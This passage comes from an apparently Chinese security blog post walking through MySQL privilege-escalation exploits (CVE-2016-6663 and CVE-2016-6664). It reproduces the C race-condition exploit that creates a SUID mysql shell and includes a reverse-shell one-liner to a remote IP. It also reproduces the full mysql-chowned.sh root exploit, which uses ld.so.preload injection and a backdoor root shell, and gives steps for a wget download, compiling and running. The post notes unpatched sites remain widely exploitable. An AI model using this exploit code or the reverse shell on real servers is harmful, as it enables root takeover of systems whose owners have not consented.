'MyISAM' data directory '"</span> EXP_PATH <span class="string">"'"</span>, <span class="number">0</span>);</span><br><span class="line">    mysql_cmd(<span class="string">"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="string">"'"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span></span><br><span class="line">    <span class="comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n"</span>);</span><br><span class="line">    system(<span class="string">"cp /bin/bash "</span> SUID_SHELL);</span><br><span class="line">    system(<span class="string">"ls -l "</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use inotify to get the timing right</span></span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"failed to inotify_init\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Entering the race loop... Hang in there...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( is_shell_suid != <span class="number">1</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line"><span class="keyword">if</span> ( (cnt % <span class="number">100</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"-&gt;"</span>);</span><br><span class="line"> <span class="comment">//fflush(stdout);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create empty file , remove if already exists */</span></span><br><span class="line">        unlink(MYSQL_TEMP_FILE);</span><br><span class="line">        unlink(MYSQL_TAB_FILE);</span><br><span class="line">   mysql_cmd(<span class="string">"DROP TABLE IF EXISTS exploit_table"</span>, <span class="number">1</span>);</span><br><span class="line">mysql_cmd(<span class="string">"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '"</span> EXP_PATH <span class="string">"'"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* random num if needed */</span></span><br><span class="line">        srand ( time(<span class="literal">NULL</span>) );</span><br><span class="line">        randomnum = ( rand() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fork failed :(\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Child process - executes REPAIR TABLE  SQL statement */</span></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            usleep(<span class="number">500</span>);</span><br><span class="line">            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">    mysql_cmd(<span class="string">"REPAIR TABLE exploit_table EXTENDED"</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// child stops here</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span></span><br><span class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            io_notified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> processed = <span class="number">0</span>;</span><br><span class="line">                ret = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">                <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (processed &lt; ret) &#123;</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    <span class="keyword">if</span> (event-&gt;mask &amp; IN_CLOSE) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(event-&gt;name, <span class="string">"exploit_table.TMD"</span>)) &#123;</span><br><span class="line">                            <span class="comment">//usleep(randomnum);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span></span><br><span class="line">    unlink(MYSQL_TAB_FILE);</span><br><span class="line">    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, <span class="number">0777</span>);</span><br><span class="line">    close(myd_handle);</span><br><span class="line">    chmod(MYSQL_TAB_FILE, <span class="number">04777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span></span><br><span class="line">                            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processed += <span class="keyword">sizeof</span>(struct inotify_event);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (io_notified) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if SUID bit was set at the end of this attempt</span></span><br><span class="line">        <span class="keyword">if</span> ( lstat(SUID_SHELL, &amp;st) == <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (st.st_mode &amp; S_ISUID) &#123;</span><br><span class="line">is_shell_suid = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n"</span>, cnt);</span><br><span class="line">    system(<span class="string">"ls -l "</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n"</span>);</span><br><span class="line">    system(SUID_SHELL <span class="string">" -p -i "</span>);</span><br><span class="line">    <span class="comment">//system(SUID_SHELL " -p -c '/bin/bash -i -p'");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* close MySQL connection and exit */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Job done. Exiting\n\n"</span>);</span><br><span class="line">    mysql_close(conn);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2.反弹shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>3.反弹shell的监听端，执行如下指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 123456 localhost testdb</span><br></pre></td></tr></table></figure></p><p>如图可以看到已提升为mysql权限</p><p><img src="http://blackwolfsec.cc/static/picture/mysql_www-data2mysql.png" alt="提升为mysql权限"></p><h2 id="0x03Mysql权限提升为root权限"><a href="#0x03Mysql权限提升为root权限" class="headerlink" title="0x03Mysql权限提升为root权限"></a>0x03Mysql权限提升为root权限</h2><p>利用CVE-2016-6664<br>ps:<strong>目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式</strong><br>不过tutum/lamp日志方式为syslog，需要如下修改<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/mysql/<span class="keyword">conf</span>.d/mysqld_safe_syslog.<span class="keyword">cnf</span></span><br><span class="line">删除syslog</span><br><span class="line">重启mysql：mysqld_safe --user=mysql</span><br></pre></td></tr></table></figure></p><p>测试办法<code>grep -r syslog /etc/mysql</code>返回没有任何结果既满足“基于文件的日志”要求<br>上传mysql-chowned.sh，内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment"># ./mysql-chowned.sh path_to_error.log </span></span><br><span class="line">BACKDOORSH=<span class="string">"/bin/bash"</span></span><br><span class="line">BACKDOORPATH=<span class="string">"/tmp/mysqlrootsh"</span></span><br><span class="line">PRIVESCLIB=<span class="string">"/tmp/privesclib.so"</span></span><br><span class="line">PRIVESCSRC=<span class="string">"/tmp/privesclib.c"</span></span><br><span class="line">SUIDBIN=<span class="string">"/usr/bin/sudo"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> cleanexit &#123;</span><br><span class="line"><span class="comment"># Cleanup </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Cleaning up..."</span></span><br><span class="line">rm -f <span class="variable">$PRIVESCSRC</span></span><br><span class="line">rm -f <span class="variable">$PRIVESCLIB</span></span><br><span class="line">rm -f <span class="variable">$ERRORLOG</span></span><br><span class="line">touch <span class="variable">$ERRORLOG</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/ld.so.preload ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -n &gt; /etc/ld.so.preload</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Job done. Exiting with code <span class="variable">$1</span> \n"</span></span><br><span class="line"><span class="built_in">exit</span> <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">ctrl_c</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">"\n[+] Ctrl+C pressed"</span></span><br><span class="line">cleanexit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#intro </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Args</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Exploit usage: \n\n<span class="variable">$0</span> path_to_error.log \n"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '&#123; print <span class="variable">$2</span> &#125;' | cut -d' ' -f1 | grep '/'`\n"</span></span><br><span class="line"><span class="built_in">exit</span> 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Priv check</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Starting the exploit as \n\033[94m`id`\033[0m"</span></span><br><span class="line">id | grep -q mysql </span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] You need to execute the exploit as mysql user! Exiting.\n"</span></span><br><span class="line"><span class="built_in">exit</span> 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set target paths</span></span><br><span class="line">ERRORLOG=<span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$ERRORLOG</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] The specified MySQL error log (<span class="variable">$ERRORLOG</span>) doesn't exist. Try again.\n"</span></span><br><span class="line"><span class="built_in">exit</span> 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Target MySQL log file set to <span class="variable">$ERRORLOG</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ Active exploitation ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> ctrl_c INT</span><br><span class="line"><span class="comment"># Compile privesc preload library</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Compiling the privesc shared library (<span class="variable">$PRIVESCSRC</span>)"</span></span><br><span class="line">cat &lt;&lt;_solibeof_&gt;<span class="variable">$PRIVESCSRC</span></span><br><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;dlfcn.h&gt;</span></span><br><span class="line">       <span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line">       <span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line">       <span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"></span><br><span class="line">uid_t geteuid(void) &#123;</span><br><span class="line">static uid_t  (*old_geteuid)();</span><br><span class="line">old_geteuid = dlsym(RTLD_NEXT, <span class="string">"geteuid"</span>);</span><br><span class="line"><span class="keyword">if</span> ( old_geteuid() == 0 ) &#123;</span><br><span class="line">chown(<span class="string">"<span class="variable">$BACKDOORPATH</span>"</span>, 0, 0);</span><br><span class="line">chmod(<span class="string">"<span class="variable">$BACKDOORPATH</span>"</span>, 04777);</span><br><span class="line">//unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> old_geteuid();</span><br><span class="line">&#125;</span><br><span class="line">_solibeof_</span><br><span class="line">/bin/bash -c <span class="string">"gcc -Wall -fPIC -shared -o <span class="variable">$PRIVESCLIB</span> <span class="variable">$PRIVESCSRC</span> -ldl"</span></span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Failed to compile the privesc lib <span class="variable">$PRIVESCSRC</span>."</span></span><br><span class="line">cleanexit 2;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare backdoor shell</span></span><br><span class="line">cp <span class="variable">$BACKDOORSH</span> <span class="variable">$BACKDOORPATH</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Backdoor/low-priv shell installed at: \n`ls -l <span class="variable">$BACKDOORPATH</span>`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Safety check</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/ld.so.preload ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] /etc/ld.so.preload already exists. Exiting for safety."</span></span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Symlink the log file to /etc</span></span><br><span class="line">rm -f <span class="variable">$ERRORLOG</span> &amp;&amp; ln -s /etc/ld.so.preload <span class="variable">$ERRORLOG</span></span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Couldn't remove the <span class="variable">$ERRORLOG</span> file or create a symlink."</span></span><br><span class="line">cleanexit 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Symlink created at: \n`ls -l <span class="variable">$ERRORLOG</span>`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for MySQL to re-open the logs</span></span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">"\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "</span></span><br><span class="line"><span class="built_in">read</span> THE_ANSWER</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$THE_ANSWER</span>"</span> = <span class="string">"y"</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Got it. Executing 'killall mysqld' now..."</span></span><br><span class="line">killall mysqld</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">while</span> :; <span class="keyword">do</span> </span><br><span class="line">sleep 0.1</span><br><span class="line"><span class="keyword">if</span> [ -f /etc/ld.so.preload ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PRIVESCLIB</span> &gt; /etc/ld.so.preload</span><br><span class="line">rm -f <span class="variable">$ERRORLOG</span></span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the privesc.so shared library to escalate privileges</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PRIVESCLIB</span> &gt; /etc/ld.so.preload</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Adding <span class="variable">$PRIVESCLIB</span> shared lib to /etc/ld.so.preload"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"</span></span><br><span class="line">chmod 755 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line"><span class="comment"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Escalating privileges via the <span class="variable">$SUIDBIN</span> SUID binary to get root!"</span></span><br><span class="line">sudo 2&gt;/dev/null &gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#while :; do </span></span><br><span class="line"><span class="comment">#sleep 0.1</span></span><br><span class="line"><span class="comment">#ps aux | grep mysqld | grep -q 'log-error'</span></span><br><span class="line"><span class="comment">#if [ $? -eq 0 ]; then</span></span><br><span class="line"><span class="comment">#break;</span></span><br><span class="line"><span class="comment">#fi</span></span><br><span class="line"><span class="comment">#done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for the rootshell</span></span><br><span class="line">ls -l <span class="variable">$BACKDOORPATH</span></span><br><span class="line">ls -l <span class="variable">$BACKDOORPATH</span> | grep rws | grep -q root</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Rootshell got assigned root SUID perms at: \n`ls -l <span class="variable">$BACKDOORPATH</span>`"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Failed to get root"</span></span><br><span class="line">cleanexit 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute the rootshell</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Spawning the rootshell <span class="variable">$BACKDOORPATH</span> now! \n"</span></span><br><span class="line"><span class="variable">$BACKDOORPATH</span> -p -c <span class="string">"rm -f /etc/ld.so.preload; rm -f <span class="variable">$PRIVESCLIB</span>"</span></span><br><span class="line"><span class="variable">$BACKDOORPATH</span> -p -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># Job done.</span></span><br><span class="line">cleanexit 0</span><br></pre></td></tr></table></figure></p><p><strong>必须以mysql权限执行才能成功提为root</strong>，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh</span></span><br><span class="line">chmod 777 mysql-chowned.<span class="keyword">sh</span></span><br><span class="line">./mysql-chowned.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/mysql/<span class="keyword">error</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></p><p>如图可以看到已获得root权限</p><p><img src="http://blackwolfsec.cc/static/picture/mysql_mysql2root.png" alt="提升为root权限"></p><h2 id="0x04回顾"><a href="#0x04回顾" class="headerlink" title="0x04回顾"></a>0x04回顾</h2><h3 id="www-data权限提升为mysql的条件"><a href="#www-data权限提升为mysql的条件" class="headerlink" title="www-data权限提升为mysql的条件"></a>www-data权限提升为mysql的条件</h3><p>1.已经getshell，获得www-data权限<br>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码<br>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</p><h3 id="mysql提升为root权限的条件"><a href="#mysql提升为root权限的条件" class="headerlink" title="mysql提升为root权限的条件"></a>mysql提升为root权限的条件</h3><p>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）<br>2.需要在mysql权限下运行才能利用（可通过上面的方式先获取mysql权限）</p><p>参考链接：<br>1.<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a><br>2.<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a><br>3.<a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html</a><br>4.<a href="http://bobao.360.cn/learning/detail/3027.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3027.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;Mysql之前爆出了CVE-2016-6662、CVE-2016-6663、CVE-2016-6664提权漏洞，影响了Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本。然而好多网站都没有升级，利用场景还是很多的，于是实践一下。&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Linux" scheme="http://blackwolfsec.cc/tags/Linux/"/>
    
      <category term="Mysql" scheme="http://blackwolfsec.cc/tags/Mysql/"/>
    
      <category term="提权" scheme="http://blackwolfsec.cc/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Eternalblue（MS17-010）纯Python3利用脚本</title>
    <link href="http://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/"/>
    <id>http://blackwolfsec.cc/2017/05/12/Eternalblue_ms17-010/</id>
    <published>2017-05-11T16:00:00.000Z</published>
    <updated>2017-05-22T11:32:51.194Z</updated>
    
